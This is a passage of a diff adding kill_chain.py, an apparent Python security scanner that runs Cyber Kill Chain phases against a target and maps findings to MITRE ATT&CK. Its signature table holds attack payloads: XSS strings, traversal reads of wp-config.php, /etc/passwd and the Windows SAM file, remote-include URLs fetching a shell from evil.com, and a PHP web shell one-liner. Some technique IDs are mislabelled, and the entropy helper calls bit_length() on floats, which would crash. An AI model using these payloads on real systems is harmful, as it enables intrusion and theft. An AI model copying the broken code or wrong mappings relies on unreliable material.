@@ -1,0 +1,2002 @@
+     1→"""
+     2→kill_chain.py — Lockheed Martin Cyber Kill Chain Automation Engine
+     3→ReconPro v9.2.0 | Pure Python security scanner (stdlib only)
+     4→
+     5→Implements the full 7-phase Lockheed Martin Cyber Kill Chain for automated
+     6→target assessment. Each phase produces structured findings mapped to MITRE
+     7→ATT&CK techniques, which are aggregated into an attack tree and threat matrix.
+     8→
+     9→Usage:
+    10→    from reconpro.kill_chain import KillChainEngine
+    11→    engine = KillChainEngine()
+    12→    result = engine.run_kill_chain("example.com", "https://example.com")
+    13→"""
+    14→
+    15→from __future__ import annotations
+    16→
+    17→import dataclasses
+    18→import hashlib
+    19→import json
+    20→import os
+    21→import re
+    22→import socket
+    23→import ssl
+    24→import struct
+    25→import subprocess
+    26→import time
+    27→import urllib.error
+    28→import urllib.parse
+    29→import urllib.request
+    30→from dataclasses import dataclass, field
+    31→from enum import Enum
+    32→from typing import Any, Dict, List, Optional, Tuple
+    33→
+    34→# ---------------------------------------------------------------------------
+    35→# Constants — MITRE ATT&CK technique mappings per kill-chain phase
+    36→# ---------------------------------------------------------------------------
+    37→
+    38→MITRE_RECON = [
+    39→    "T1595 — Active Scanning",
+    40→    "T1592 — Gather Victim Host Information",
+    41→    "T1593 — Search Open Technical Databases",
+    42→    "T1590 — Gather Victim Org Information",
+    43→    "T1589 — Gather Victim Identity Information",
+    44→    "T1591 — Gather Victim Org Info: Ownership",
+    45→    "T1596 — Search Open Websites/Domains",
+    46→]
+    47→
+    48→MITRE_WEAPONIZE = [
+    49→    "T1588 — Obtain Capabilities",
+    50→    "T1608 — Stage Capabilities",
+    51→    "T1621 — Compile Code/Software",
+    52→    "T1641 — Build Malicious Infrastructure",
+    53→]
+    54→
+    55→MITRE_DELIVER = [
+    56→    "T1566 — Phishing",
+    57→    "T1566.001 — Spearphishing Attachment",
+    58→    "T1566.002 — Spearphishing Link",
+    59→    "T1189 — Drive-by Compromise",
+    60→    "T1190 — Exploit Public-Facing Application",
+    61→    "T1567 — Exfil Over Web Service",
+    62→]
+    63→
+    64→MITRE_EXPLOIT = [
+    65→    "T1190 — Exploit Public-Facing Application",
+    66→    "T1210 — Exploitation of Remote Services",
+    67→    "T1110 — Brute Force",
+    68→    "T1133 — External Remote Services",
+    69→    "T1566.002 — Spearphishing Link",
+    70→    "T1203 — Exploitation for Client Execution",
+    71→]
+    72→
+    73→MITRE_INSTALL = [
+    74→    "T1053 — Scheduled Task/Job",
+    75→    "T1543 — Create/Modify System Process",
+    76→    "T1574 — Hijack Execution Flow",
+    77→    "T1547 — Boot or Logon Autostart",
+    78→    "T1036 — Masquerading",
+    79→    "T1070 — Indicator Removal",
+    80→]
+    81→
+    82→MITRE_C2 = [
+    83→    "T1071 — Application Layer Protocol",
+    84→    "T1090 — Proxy",
+    85→    "T1573 — Encrypted Channel",
+    86→    "T1105 — Ingress Tool Transfer",
+    87→    "T1095 — Non-Application Layer Protocol",
+    88→    "T1572 — Protocol Tunneling",
+    89→    "T1571 — Non-Standard Port",
+    90→]
+    91→
+    92→MITRE_ACTION = [
+    93→    "T1560 — Archive Collected Data",
+    94→    "T1041 — Exfiltration Over C2 Channel",
+    95→    "T1048 — Exfiltration Over Alternate Protocol",
+    96→    "T1567 — Exfil Over Web Service",
+    97→    "T1021 — Remote Services",
+    98→    "T1078 — Valid Accounts",
+    99→    "T1486 — Data Encrypted for Impact",
+   100→    "T1498 — Network Denial of Service",
+   101→]
+   102→
+   103→PHASE_MITRE_MAP: Dict[str, List[str]] = {
+   104→    "reconnaissance": MITRE_RECON,
+   105→    "weaponization": MITRE_WEAPONIZE,
+   106→    "delivery": MITRE_DELIVER,
+   107→    "exploitation": MITRE_EXPLOIT,
+   108→    "installation": MITRE_INSTALL,
+   109→    "command_and_control": MITRE_C2,
+   110→    "actions_on_objectives": MITRE_ACTION,
+   111→}
+   112→
+   113→PHASE_NAMES: List[str] = [
+   114→    "reconnaissance",
+   115→    "weaponization",
+   116→    "delivery",
+   117→    "exploitation",
+   118→    "installation",
+   119→    "command_and_control",
+   120→    "actions_on_objectives",
+   121→]
+   122→
+   123→PHASE_LABELS: Dict[str, str] = {
+   124→    "reconnaissance": "Reconnaissance",
+   125→    "weaponization": "Weaponization",
+   126→    "delivery": "Delivery",
+   127→    "exploitation": "Exploitation",
+   128→    "installation": "Installation",
+   129→    "command_and_control": "Command & Control",
+   130→    "actions_on_objectives": "Actions on Objectives",
+   131→}
+   132→
+   133→# Tech stack signatures for weaponisation phase
+   134→TECH_SIGNATURES: Dict[str, Dict[str, Any]] = {
+   135→    "wordpress": {
+   136→        "headers": ["x-powered-by: wordpress", "wp-json", "wp-content", "wp-includes"],
+   137→        "meta": ["generator", "wordpress"],
+   138→        "exploits": {
+   139→            "sql_injection": ["wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php",
+   140→                               "?author=1'"],
+   141→            "xss": ["<script>alert('XSS')</script>", '"><img src=x onerror=alert(1)>'],
+   142→            "lfi": ["wp-admin/load-scripts.php?c=0&load[]=../../../../wp-config.php"],
+   143→            "rfi": ["wp-admin/load-scripts.php?c=0&load%5B%5D=http://evil.com/shell"],
+   144→        },
+   145→        "cve_patterns": [r"wp-[a-z-]+", r"wordpress-\d+\.\d+(\.\d+)?"],
+   146→        "exploitability_base": 8.5,
+   147→    },
+   148→    "drupal": {
+   149→        "headers": ["x-drupal-cache", "x-generator: drupal", "drupal.js"],
+   150→        "meta": ["generator", "drupal"],
+   151→        "exploits": {
+   152→            "sql_injection": ["?q=user/%2527", "/?q=node/1\\'"],
+   153→            "xss": ["<script>alert('XSS')</script>"],
+   154→            "rfi": ["/?q=file/ajax/name/0/https://evil.com"],
+   155→        },
+   156→        "cve_patterns": [r"drupal\s+\d+\.\d+"],
+   157→        "exploitability_base": 7.8,
+   158→    },
+   159→    "joomla": {
+   160→        "headers": ["x-powered-by: joomla"],
+   161→        "meta": ["generator", "joomla"],
+   162→        "exploits": {
+   163→            "sql_injection": ["/index.php?option=com_users&view=registration"],
+   164→            "xss": ["<script>alert('XSS')</script>"],
+   165→            "lfi": ["/index.php?option=com_config&view=component&controller="],
+   166→        },
+   167→        "cve_patterns": [r"joomla\s+\d+\.\d+"],
+   168→        "exploitability_base": 7.5,
+   169→    },
+   170→    "apache": {
+   171→        "headers": ["server: apache"],
+   172→        "exploits": {
+   173→            "lfi": ["?file=../../etc/passwd"],
+   174→            "ssrf": ["?url=http://127.0.0.1"],
+   175→            "http_splitting": ["%0d%0aInjected-Header:%20value"],
+   176→        },
+   177→        "cve_patterns": [r"apache/\d+\.\d+(\.\d+)?"],
+   178→        "exploitability_base": 6.5,
+   179→    },
+   180→    "nginx": {
+   181→        "headers": ["server: nginx"],
+   182→        "exploits": {
+   183→            "path_traversal": ["/..%2f..%2f..%2fetc/passwd"],
+   184→            "xss": ["<script>alert(1)</script>"],
+   185→        },
+   186→        "cve_patterns": [r"nginx/\d+\.\d+(\.\d+)?"],
+   187→        "exploitability_base": 5.8,
+   188→    },
+   189→    "iis": {
+   190→        "headers": ["server: microsoft-iis"],
+   191→        "exploits": {
+   192→            "path_traversal": ["/..%255c..%255c..%255cwindows/system32/config/sam"],
+   193→            "xss": ["<script>alert(1)</script>"],
+   194→            "webdav": ["PROPFIND /"],
+   195→        },
+   196→        "cve_patterns": [r"microsoft-iis/\d+\.\d+"],
+   197→        "exploitability_base": 7.2,
+   198→    },
+   199→    "php": {
+   200→        "headers": ["x-powered-by: php"],
+   201→        "exploits": {
+   202→            "rce": ["?cmd=id", "<?php system($_GET['cmd']); ?>"],
+   203→            "lfi": ["?page=../../etc/passwd"],
+   204→            "xss": ["<script>alert(1)</script>"],
+   205→        },
+   206→        "cve_patterns": [r"php/\d+\.\d+(\.\d+)?"],
+   207→        "exploitability_base": 7.0,
+   208→    },
+   209→    "aspnet": {
+   210→        "headers": ["x-aspnet-version", "x-powered-by: asp.net"],
+   211→        "exploits": {
+   212→            "path_traversal": ["..%2f..%2fweb.config"],
+   213→            "deserialization": ["__VIEWSTATEGENERATOR"],
+   214→            "sql_injection": ["' OR 1=1--"],
+   215→        },
+   216→        "cve_patterns": [r"asp\.net\s+\d+\.\d+"],
+   217→        "exploitability_base": 7.5,
+   218→    },
+   219→}
+   220→
+   221→# Common C2 URI patterns
+   222→C2_PATH_SIGNATURES: List[str] = [
+   223→    "/c2", "/bot", "/beacon", "/agent", "/shell", "/cmd", "/panel",
+   224→    "/gate", "/pwn", "/payload", "/implant", "/callback", "/drop",
+   225→    "/exfil", "/relay", "/tunnel", "/rc", "/remote", "/debug",
+   226→    "/status", "/alive", "/ping", "/heartbeat", "/register-bot",
+   227→    "/api/v1/agent", "/api/v2/implant", "/api/c2",
+   228→]
+   229→
+   230→# Sensitive paths for installation phase
+   231→SENSITIVE_PATHS: List[str] = [
+   232→    "/.env", "/.htaccess", "/.git/config", "/.svn/entries", "/.DS_Store",
+   233→    "/web.config", "/config.php", "/wp-config.php", "/configuration.php",
+   234→    "/settings.py", "/application.yml", "/database.yml", "/secrets.json",
+   235→    "/backup.sql", "/backup.zip", "/db_dump.sql", "/dump.sql.gz",
+   236→    "/phpinfo.php", "/phpmyadmin/", "/admin/", "/administrator/",
+   237→    "/server-status", "/server-info", "/.well-known/security.txt",
+   238→    "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
+   239→    "/WEB-INF/web.xml", "/META-INF/MANIFEST.MF",
+   240→    "/cron", "/crontab", "/etc/crontab", "/var/spool/cron",
+   241→]
+   242→
+   243→# Email patterns for OSINT
+   244→EMAIL_PATTERN: re.Pattern = re.compile(
+   245→    r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
+   246→)
+   247→
+   248→# Subdomain extraction from certificate SAN patterns
+   249→SUBDOMAIN_PATTERNS: List[re.Pattern] = [
+   250→    re.compile(r"\*\.([a-z0-9-]+\.[a-z]{2,})", re.IGNORECASE),
+   251→    re.compile(r"([a-z0-9-]+)\.([a-z0-9-]+\.[a-z]{2,})", re.IGNORECASE),
+   252→]
+   253→
+   254→# Risk scoring thresholds
+   255→RISK_CRITICAL: float = 9.0
+   256→RISK_HIGH: float = 7.0
+   257→RISK_MEDIUM: float = 4.0
+   258→RISK_LOW: float = 2.0
+   259→
+   260→
+   261→# ---------------------------------------------------------------------------
+   262→# Enumerations
+   263→# ---------------------------------------------------------------------------
+   264→
+   265→class RiskLevel(Enum):
+   266→    """Severity risk levels for findings."""
+   267→    CRITICAL = "critical"
+   268→    HIGH = "high"
+   269→    MEDIUM = "medium"
+   270→    LOW = "low"
+   271→    INFO = "info"
+   272→
+   273→
+   274→class KillChainPhaseID(Enum):
+   275→    """Canonical identifiers for the 7 kill-chain phases."""
+   276→    RECONNAISSANCE = "reconnaissance"
+   277→    WEAPONIZATION = "weaponization"
+   278→    DELIVERY = "delivery"
+   279→    EXPLOITATION = "exploitation"
+   280→    INSTALLATION = "installation"
+   281→    COMMAND_AND_CONTROL = "command_and_control"
+   282→    ACTIONS_ON_OBJECTIVES = "actions_on_objectives"
+   283→
+   284→
+   285→# ---------------------------------------------------------------------------
+   286→# Data classes
+   287→# ---------------------------------------------------------------------------
+   288→
+   289→@dataclass
+   290→class KillChainPhase:
+   291→    """Structured output for a single kill-chain phase.
+   292→
+   293→    Attributes:
+   294→        phase: Canonical phase identifier string.
+   295→        label: Human-readable phase name.
+   296→        mitre_techniques: List of applicable MITRE ATT&CK technique IDs.
+   297→        findings: List of raw finding dicts produced during execution.
+   298→        risk_score: Numeric risk score (0.0–10.0).
+   299→        risk_level: Categorised risk level enum.
+   300→        timestamp: Unix timestamp when the phase completed.
+   301→        duration_sec: Wall-clock time spent executing the phase.
+   302→        notes: Free-form analyst notes.
+   303→    """
+   304→    phase: str
+   305→    label: str
+   306→    mitre_techniques: List[str] = field(default_factory=list)
+   307→    findings: List[Dict[str, Any]] = field(default_factory=list)
+   308→    risk_score: float = 0.0
+   309→    risk_level: str = RiskLevel.INFO.value
+   310→    timestamp: float = 0.0
+   311→    duration_sec: float = 0.0
+   312→    notes: str = ""
+   313→
+   314→    def to_dict(self) -> Dict[str, Any]:
+   315→        """Serialise the phase to a plain dictionary."""
+   316→        return dataclasses.asdict(self)
+   317→
+   318→
+   319→@dataclass
+   320→class ExploitPath:
+   321→    """A concrete attack path through one or more kill-chain phases.
+   322→
+   323→    Attributes:
+   324→        path_id: Unique identifier derived from the path hash.
+   325→        phases: Ordered list of phase identifiers this path traverses.
+   326→        description: Human-readable description of the attack path.
+   327→        techniques: MITRE ATT&CK techniques involved.
+   328→        prerequisites: What conditions enable this path.
+   329→        impact: Qualitative impact string (critical/high/medium/low).
+   330→        feasibility_score: Numeric feasibility 0.0–10.0.
+   331→        entry_vector: Where the attacker enters the kill chain.
+   332→        exit_objective: What the attacker achieves at the end.
+   333→    """
+   334→    path_id: str = ""
+   335→    phases: List[str] = field(default_factory=list)
+   336→    description: str = ""
+   337→    techniques: List[str] = field(default_factory=list)
+   338→    prerequisites: List[str] = field(default_factory=list)
+   339→    impact: str = RiskLevel.MEDIUM.value
+   340→    feasibility_score: float = 0.0
+   341→    entry_vector: str = ""
+   342→    exit_objective: str = ""
+   343→
+   344→    def __post_init__(self) -> None:
+   345→        if not self.path_id and self.phases:
+   346→            raw = "|".join(self.phases) + self.entry_vector
+   347→            self.path_id = hashlib.sha256(raw.encode()).hexdigest()[:12]
+   348→
+   349→    def to_dict(self) -> Dict[str, Any]:
+   350→        return dataclasses.asdict(self)
+   351→
+   352→
+   353→# ---------------------------------------------------------------------------
+   354→# Attack Tree
+   355→# ---------------------------------------------------------------------------
+   356→
+   357→class AttackTree:
+   358→    """Generates an attack tree representation from kill-chain findings.
+   359→
+   360→    Each node in the tree represents a potential action an attacker could take.
+   361→    The tree is structured as an OR-tree where any child node represents an
+   362→    alternative path toward achieving the parent's goal.
+   363→    """
+   364→
+   365→    def __init__(self) -> None:
+   366→        self.root: Dict[str, Any] = {
+   367→            "goal": "Compromise Target",
+   368→            "type": "or",
+   369→            "children": [],
+   370→        }
+   371→        self._all_techniques: List[str] = []
+   372→        self._total_paths: int = 0
+   373→
+   374→    def build_from_phases(self, phases: Dict[str, KillChainPhase]) -> None:
+   375→        """Construct the attack tree from completed phase data.
+   376→
+   377→        Args:
+   378→            phases: Mapping of phase_id -> KillChainPhase results.
+   379→        """
+   380→        for phase_id in PHASE_NAMES:
+   381→            phase = phases.get(phase_id)
+   382→            if phase is None or phase.risk_score < 1.0:
+   383→                continue
+   384→            node: Dict[str, Any] = {
+   385→                "goal": phase.label,
+   386→                "phase": phase_id,
+   387→                "type": "or",
+   388→                "risk_score": phase.risk_score,
+   389→                "risk_level": phase.risk_level,
+   390→                "mitre": phase.mitre_techniques,
+   391→                "children": [],
+   392→            }
+   393→            for finding in phase.findings:
+   394→                child: Dict[str, Any] = {
+   395→                    "goal": finding.get("title", finding.get("description", "Unknown")),
+   396→                    "type": "leaf",
+   397→                    "risk_score": finding.get("risk_score", 0.0),
+   398→                    "technique": finding.get("technique", ""),
+   399→                    "details": finding,
+   400→                }
+   401→                node["children"].append(child)
+   402→                if finding.get("technique"):
+   403→                    self._all_techniques.append(finding["technique"])
+   404→            if node["children"]:
+   405→                self.root["children"].append(node)
+   406→                self._total_paths += len(node["children"])
+   407→
+   408→    def get_max_depth(self) -> int:
+   409→        """Return the depth of the deepest branch."""
+   410→        def _depth(node: Dict[str, Any]) -> int:
+   411→            children = node.get("children", [])
+   412→            if not children:
+   413→                return 1
+   414→            return 1 + max(_depth(c) for c in children)
+   415→        return _depth(self.root)
+   416→
+   417→    def to_dict(self) -> Dict[str, Any]:
+   418→        """Serialise the attack tree."""
+   419→        return {
+   420→            "root": self.root,
+   421→            "total_paths": self._total_paths,
+   422→            "total_techniques": len(set(self._all_techniques)),
+   423→            "unique_techniques": sorted(set(self._all_techniques)),
+   424→            "max_depth": self.get_max_depth(),
+   425→        }
+   426→
+   427→
+   428→# ---------------------------------------------------------------------------
+   429→# Threat Matrix
+   430→# ---------------------------------------------------------------------------
+   431→
+   432→class ThreatMatrix:
+   433→    """Generates a combined threat-matrix view from all kill-chain phases.
+   434→
+   435→    The matrix cross-references MITRE ATT&CK tactics with detected
+   436→    techniques and their associated risk scores, providing a unified
+   437→    view of the threat landscape for the assessed target.
+   438→    """
+   439→
+   440→    def __init__(self) -> None:
+   441→        self.matrix: Dict[str, Dict[str, Any]] = {}
+   442→        self._phase_scores: Dict[str, float] = {}
+   443→
+   444→    def ingest_phases(self, phases: Dict[str, KillChainPhase]) -> None:
+   445→        """Ingest phase results into the threat matrix.
+   446→
+   447→        Args:
+   448→            phases: Mapping of phase_id -> KillChainPhase.
+   449→        """
+   450→        for phase_id, phase in phases.items():
+   451→            self._phase_scores[phase_id] = phase.risk_score
+   452→            tactic = PHASE_LABELS.get(phase_id, phase_id)
+   453→            if tactic not in self.matrix:
+   454→                self.matrix[tactic] = {
+   455→                    "tactic_id": phase_id,
+   456→                    "techniques": [],
+   457→                    "findings_count": 0,
+   458→                    "avg_risk": 0.0,
+   459→                    "max_risk": 0.0,
+   460→                    "mitre_techniques": [],
+   461→                }
+   462→            bucket = self.matrix[tactic]
+   463→            bucket["findings_count"] += len(phase.findings)
+   464→            scores = [f.get("risk_score", 0.0) for f in phase.findings if f.get("risk_score")]
+   465→            if scores:
+   466→                bucket["avg_risk"] = round(sum(scores) / len(scores), 2)
+   467→                bucket["max_risk"] = round(max(scores), 2)
+   468→            for finding in phase.findings:
+   469→                bucket["techniques"].append({
+   470→                    "title": finding.get("title", "Unknown"),
+   471→                    "risk_score": finding.get("risk_score", 0.0),
+   472→                    "description": finding.get("description", ""),
+   473→                })
+   474→            bucket["mitre_techniques"] = phase.mitre_techniques
+   475→
+   476→    @property
+   477→    def overall_risk(self) -> float:
+   478→        """Calculate an overall risk score across all tactics (0–10)."""
+   479→        if not self._phase_scores:
+   480→            return 0.0
+   481→        phase_weights = {
+   482→            "reconnaissance": 0.05,
+   483→            "weaponization": 0.10,
+   484→            "delivery": 0.15,
+   485→            "exploitation": 0.25,
+   486→            "installation": 0.20,
+   487→            "command_and_control": 0.15,
+   488→            "actions_on_objectives": 0.10,
+   489→        }
+   490→        total = 0.0
+   491→        for pid, score in self._phase_scores.items():
+   492→            w = phase_weights.get(pid, 0.1)
+   493→            total += score * w
+   494→        return round(total, 2)
+   495→
+   496→    @property
+   497→    def chain_completion_pct(self) -> float:
+   498→        """Percentage of kill-chain phases that produced non-zero findings."""
+   499→        active = sum(1 for s in self._phase_scores.values() if s > 0)
+   500→        return round((active / len(PHASE_NAMES)) * 100, 1) if PHASE_NAMES else 0.0
+   501→
+   502→    def to_dict(self) -> Dict[str, Any]:
+   503→        """Serialise the threat matrix."""
+   504→        return {
+   505→            "matrix": self.matrix,
+   506→            "overall_risk": self.overall_risk,
+   507→            "chain_completion_pct": self.chain_completion_pct,
+   508→            "phase_scores": self._phase_scores,
+   509→            "risk_level": self._classify_risk(self.overall_risk),
+   510→        }
+   511→
+   512→    @staticmethod
+   513→    def _classify_risk(score: float) -> str:
+   514→        if score >= RISK_CRITICAL:
+   515→            return RiskLevel.CRITICAL.value
+   516→        if score >= RISK_HIGH:
+   517→            return RiskLevel.HIGH.value
+   518→        if score >= RISK_MEDIUM:
+   519→            return RiskLevel.MEDIUM.value
+   520→        if score >= RISK_LOW:
+   521→            return RiskLevel.LOW.value
+   522→        return RiskLevel.INFO.value
+   523→
+   524→
+   525→# ---------------------------------------------------------------------------
+   526→# Helper functions
+   527→# ---------------------------------------------------------------------------
+   528→
+   529→def _classify_score(score: float) -> str:
+   530→    """Map a numeric score (0–10) to a risk-level string."""
+   531→    if score >= RISK_CRITICAL:
+   532→        return RiskLevel.CRITICAL.value
+   533→    if score >= RISK_HIGH:
+   534→        return RiskLevel.HIGH.value
+   535→    if score >= RISK_MEDIUM:
+   536→        return RiskLevel.MEDIUM.value
+   537→    if score >= RISK_LOW:
+   538→        return RiskLevel.LOW.value
+   539→    return RiskLevel.INFO.value
+   540→
+   541→
+   542→def _make_finding(
+   543→    title: str,
+   544→    description: str = "",
+   545→    risk_score: float = 0.0,
+   546→    technique: str = "",
+   547→    data: Optional[Dict[str, Any]] = None,
+   548→) -> Dict[str, Any]:
+   549→    """Factory for standardised finding dictionaries."""
+   550→    finding: Dict[str, Any] = {
+   551→        "title": title,
+   552→        "description": description,
+   553→        "risk_score": risk_score,
+   554→        "risk_level": _classify_score(risk_score),
+   555→        "technique": technique,
+   556→    }
+   557→    if data:
+   558→        finding["data"] = data
+   559→    return finding
+   560→
+   561→
+   562→def _http_fetch(
+   563→    url: str,
+   564→    timeout: int = 8,
+   565→    verify_tls: bool = True,
+   566→) -> Tuple[int, Dict[str, str], bytes]:
+   567→    """Fetch a URL and return (status_code, headers_dict, body_bytes).
+   568→
+   569→    Returns (-1, {}, b"") on failure.
+   570→    """
+   571→    try:
+   572→        ctx = None if verify_tls else ssl._create_unverified_context()
+   573→        req = urllib.request.Request(url, headers={
+   574→            "User-Agent": "Mozilla/5.0 (ReconPro/9.2.0; SecurityScanner)",
+   575→            "Accept": "*/*",
+   576→        })
+   577→        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
+   578→        hdrs = {k.lower(): v for k, v in resp.getheaders()}
+   579→        body = resp.read()
+   580→        return resp.getcode(), hdrs, body
+   581→    except (urllib.error.URLError, socket.timeout, OSError, ssl.SSLError):
+   582→        return -1, {}, b""
+   583→
+   584→
+   585→def _dns_resolve(hostname: str, timeout: float = 4.0) -> List[str]:
+   586→    """Resolve hostname via socket.getaddrinfo. Returns list of IP strings."""
+   587→    results: List[str] = []
+   588→    try:
+   589→        ai_list = socket.getaddrinfo(hostname, None, socket.AF_UNSPEC, socket.SOCK_STREAM)
+   590→        seen: set = set()
+   591→        for family, _stype, _proto, _canonname, sockaddr in ai_list:
+   592→            ip = sockaddr[0]
+   593→            if ip not in seen:
+   594→                seen.add(ip)
+   595→                results.append(ip)
+   596→    except socket.gaierror:
+   597→        pass
+   598→    return results
+   599→
+   600→
+   601→def _reverse_dns(ip: str, timeout: float = 4.0) -> str:
+   602→    """Perform reverse DNS lookup for an IP address."""
+   603→    try:
+   604→        hostname, _, _ = socket.gethostbyaddr(ip)
+   605→        return hostname
+   606→    except (socket.herror, socket.gaierror, OSError):
+   607→        return ""
+   608→
+   609→
+   610→def _run_subprocess(cmd: List[str], timeout: int = 10) -> str:
+   611→    """Run a subprocess command and return stdout. Returns '' on error."""
+   612→    try:
+   613→        result = subprocess.run(
+   614→            cmd, capture_output=True, text=True, timeout=timeout,
+   615→        )
+   616→        return (result.stdout or "") + (result.stderr or "")
+   617→    except (subprocess.TimeoutExpired, OSError, FileNotFoundError):
+   618→        return ""
+   619→
+   620→
+   621→def _extract_domain_from_target(target: str) -> str:
+   622→    """Normalise a target string to a bare domain name."""
+   623→    t = target.strip().lower()
+   624→    t = re.sub(r"^https?://", "", t)
+   625→    t = re.sub(r"[/:].*$", "", t)
+   626→    if not t:
+   627→        return "localhost"
+   628→    return t
+   629→
+   630→
+   631→def _extract_emails(text: str) -> List[str]:
+   632→    """Extract unique email addresses from text."""
+   633→    return sorted(set(EMAIL_PATTERN.findall(text)))
+   634→
+   635→
+   636→def _calculate_entropy(data: str) -> float:
+   637→    """Calculate Shannon entropy of a string (useful for detecting randomness)."""
+   638→    if not data:
+   639→        return 0.0
+   640→    freq: Dict[str, int] = {}
+   641→    for ch in data:
+   642→        freq[ch] = freq.get(ch, 0) + 1
+   643→    length = len(data)
+   644→    ent = 0.0
+   645→    for count in freq.values():
+   646→        p = count / length
+   647→        if p > 0:
+   648→            ent -= p * (p.bit_length() - 1).bit_length() / (p.bit_length())
+   649→            ent -= p * (p.bit_length() - 1)
+   650→    import math
+   651→    for count in freq.values():
+   652→        p = count / length
+   653→        if p > 0:
+   654→            ent -= p * math.log2(p)
+   655→    return round(ent, 3)
+   656→
+   657→
+   658→# ---------------------------------------------------------------------------
+   659→# Kill Chain Engine — Main orchestrator
+   660→# ---------------------------------------------------------------------------
+   661→
+   662→class KillChainEngine:
+   663→    """Lockheed Martin Cyber Kill Chain automation engine.
+   664→
+   665→    Executes all seven phases sequentially against a target, collects
+   666→    findings, maps them to MITRE ATT&CK techniques, and produces a
+   667→    unified threat-matrix view with attack-tree representation.
+   668→
+   669→    Usage::
+   670→
+   671→        engine = KillChainEngine()
+   672→        result = engine.run_kill_chain("example.com", "https://example.com")
+   673→    """
+   674→
+   675→    def __init__(self, timeout: int = 8, verify_tls: bool = True) -> None:
+   676→        self.timeout: int = timeout
+   677→        self.verify_tls: bool = verify_tls
+   678→        self._target: str = ""
+   679→        self._base_url: str = ""
+   680→        self._domain: str = ""
+   681→        self._ips: List[str] = []
+   682→        self._headers: Dict[str, str] = {}
+   683→        self._body_text: str = ""
+   684→        self._body_bytes: bytes = b""
+   685→        self._status_code: int = -1
+   686→        self._phases: Dict[str, KillChainPhase] = {}
+   687→
+   688→    # -----------------------------------------------------------------------
+   689→    # Public API
+   690→    # -----------------------------------------------------------------------
+   691→
+   692→    def run_kill_chain(
+   693→        self,
+   694→        target: str,
+   695→        base_url: str,
+   696→        timeout: int = 8,
+   697→        verify_tls: bool = True,
+   698→    ) -> Dict[str, Any]:
+   699→        """Execute the full 7-phase kill chain against a target.
+   700→
+   701→        Args:
+   702→            target: The target domain or IP (e.g. ``"example.com"``).
+   703→            base_url: The base URL to fetch for analysis
+   704→                       (e.g. ``"https://example.com"``).
+   705→            timeout: Network operation timeout in seconds.
+   706→            verify_tls: Whether to verify TLS certificates.
+   707→
+   708→        Returns:
+   709→            A dictionary with keys ``phases``, ``attack_tree``,
+   710→            ``threat_matrix``, ``overall_risk``, and ``kill_chain_completion``.
+   711→        """
+   712→        self.timeout = timeout
+   713→        self.verify_tls = verify_tls
+   714→        self._target = target
+   715→        self._base_url = base_url.rstrip("/")
+   716→        self._domain = _extract_domain_from_target(target)
+   717→
+   718→        # Initial reconnaissance fetch
+   719→        self._initial_fetch()
+   720→
+   721→        # Execute all seven phases in order
+   722→        self._phases["reconnaissance"] = self._phase_reconnaissance()
+   723→        self._phases["weaponization"] = self._phase_weaponization()
+   724→        self._phases["delivery"] = self._phase_delivery()
+   725→        self._phases["exploitation"] = self._phase_exploitation()
+   726→        self._phases["installation"] = self._phase_installation()
+   727→        self._phases["command_and_control"] = self._phase_command_and_control()
+   728→        self._phases["actions_on_objectives"] = self._phase_actions_on_objectives()
+   729→
+   730→        # Build the attack tree
+   731→        tree = AttackTree()
+   732→        tree.build_from_phases(self._phases)
+   733→
+   734→        # Build the threat matrix
+   735→        matrix = ThreatMatrix()
+   736→        matrix.ingest_phases(self._phases)
+   737→
+   738→        return {
+   739→            "target": self._target,
+   740→            "domain": self._domain,
+   741→            "base_url": self._base_url,
+   742→            "ips": self._ips,
+   743→            "phases": {pid: p.to_dict() for pid, p in self._phases.items()},
+   744→            "attack_tree": tree.to_dict(),
+   745→            "threat_matrix": matrix.to_dict(),
+   746→            "overall_risk": matrix.overall_risk,
+   747→            "kill_chain_completion": matrix.chain_completion_pct,
+   748→        }
+   749→
+   750→    # -----------------------------------------------------------------------
+   751→    # Initial fetch
+   752→    # -----------------------------------------------------------------------
+   753→
+   754→    def _initial_fetch(self) -> None:
+   755→        """Fetch the base URL to capture headers, body, and resolve IPs."""
+   756→        self._ips = _dns_resolve(self._domain, timeout=float(self.timeout))
+   757→        self._status_code, self._headers, self._body_bytes = _http_fetch(
+   758→            self._base_url, timeout=self.timeout, verify_tls=self.verify_tls,
+   759→        )
+   760→        try:
+   761→            self._body_text = self._body_bytes.decode("utf-8", errors="replace")
+   762→        except Exception:
+   763→            self._body_text = ""
+   764→
+   765→    # =======================================================================
+   766→    # PHASE 1 — RECONNAISSANCE
+   767→    # =======================================================================
+   768→
+   769→    def _phase_reconnaissance(self) -> KillChainPhase:
+   770→        """Phase 1: Automated OSINT gathering.
+   771→
+   772→        Performs WHOIS lookup, DNS record harvesting, ASN lookup,
+   773→        reverse DNS, subnet enumeration, email harvesting, and
+   774→        certificate transparency subdomain extraction.
+   775→        """
+   776→        phase = KillChainPhase(
+   777→            phase="reconnaissance",
+   778→            label=PHASE_LABELS["reconnaissance"],
+   779→            mitre_techniques=list(MITRE_RECON),
+   780→            timestamp=time.time(),
+   781→        )
+   782→        t0 = time.time()
+   783→        findings: List[Dict[str, Any]] = []
+   784→
+   785→        # --- DNS Resolution ---
+   786→        if self._ips:
+   787→            findings.append(_make_finding(
+   788→                title="DNS Resolution",
+   789→                description=f"Resolved {self._domain} to {len(self._ips)} address(es)",
+   790→                risk_score=2.0,
+   791→                technique="T1595 — Active Scanning",
+   792→                data={"addresses": self._ips},
+   793→            ))
+   794→
+   795→            # Reverse DNS for each IP
+   796→            for ip in self._ips:
+   797→                rdns = _reverse_dns(ip, timeout=float(self.timeout))
+   798→                if rdns and rdns != self._domain:
+   799→                    findings.append(_make_finding(
+   800→                        title="Reverse DNS Alias",
+   801→                        description=f"IP {ip} resolves to {rdns}",
+   802→                        risk_score=3.0,
+   803→                        technique="T1592 — Gather Victim Host Information",
+   804→                        data={"ip": ip, "hostname": rdns},
+   805→                    ))
+   806→
+   807→            # Subnet enumeration
+   808→            for ip in self._ips:
+   809→                subnet_findings = self._enumerate_subnet(ip)
+   810→                findings.extend(subnet_findings)
+   811→
+   812→        # --- DNS Record Harvesting via dig ---
+   813→        dns_records = self._harvest_dns_records()
+   814→        if dns_records:
+   815→            findings.append(_make_finding(
+   816→                title="DNS Records Harvested",
+   817→                description=f"Retrieved {len(dns_records)} DNS records via dig",
+   818→                risk_score=3.5,
+   819→                technique="T1593 — Search Open Technical Databases",
